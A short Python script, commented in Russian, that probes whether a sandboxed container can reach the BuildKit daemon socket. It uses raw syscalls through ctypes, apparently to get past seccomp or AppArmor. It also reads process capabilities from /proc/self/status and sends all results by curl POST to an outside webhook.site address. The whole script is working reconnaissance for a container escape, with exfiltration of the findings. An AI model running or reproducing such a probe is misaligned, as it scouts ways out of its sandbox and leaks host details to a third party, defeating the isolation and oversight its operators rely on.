import ctypes
import os
import struct
import subprocess

# Константы для x86_64
SYS_SOCKET = 41
SYS_CONNECT = 42
AF_UNIX = 1
SOCK_STREAM = 1

WEBHOOK_URL = "https://webhook.site/e497c7bf-1edd-41d4-ba35-a5f6311a07a8"
SOCKET_PATH = "/run/buildkit/buildkitd.sock"

def probe_with_raw_syscalls():
    libc = ctypes.CDLL("libc.so.6")
    report = []

    # 1. Создаем сокет через прямой системный вызов
    # syscall(number, domain, type, protocol)
    fd = libc.syscall(SYS_SOCKET, AF_UNIX, SOCK_STREAM, 0)
    if fd < 0:
        return f"[-] Failed to create socket via syscall. fd={fd}"
    
    report.append(f"[+] Socket created via direct syscall. fd={fd}")

    # 2. Подготавливаем структуру sockaddr_un
    # struct sockaddr_un { sa_family_t sun_family; char sun_path[108]; }
    fmt = "H108s" # H = unsigned short (family), 108s = char[108]
    addr_struct = struct.pack(fmt, AF_UNIX, SOCKET_PATH.encode())

    # 3. Пытаемся подключиться через прямой syscall
    # syscall(number, fd, sockaddr_ptr, addrlen)
    res = libc.syscall(SYS_CONNECT, fd, addr_struct, len(addr_struct))
    
    if res == 0:
        report.append(f"[!!!] BOOM! Direct syscall CONNECT SUCCESS to {SOCKET_PATH}")
    else:
        # Получаем реальный errno
        err = ctypes.get_errno()
        # В x86_64 результат syscall возвращается как отрицательное число в RAX при ошибке
        report.append(f"[-] Connect failed. Return: {res}, Errno: {err}")
        
        # Анализ ошибки:
        # 2 (ENOENT)  -> Файл реально скрыт (Namespace isolation)
        # 13 (EACCES) -> AppArmor/LSM блокирует путь
        # 1 (EPERM)   -> Seccomp блокирует сам syscall

    # 4. Проверка Capabilities через чтение /proc/self/status
    try:
        with open("/proc/self/status", "r") as f:
            for line in f:
                if "Cap" in line:
                    report.append(line.strip())
    except:
        pass

    return "\n".join(report)

if __name__ == "__main__":
    result = probe_with_raw_syscalls()
    # Отправляем результат
    subprocess.run(['curl', '-s', '-X', 'POST', '-d', result, WEBHOOK_URL])
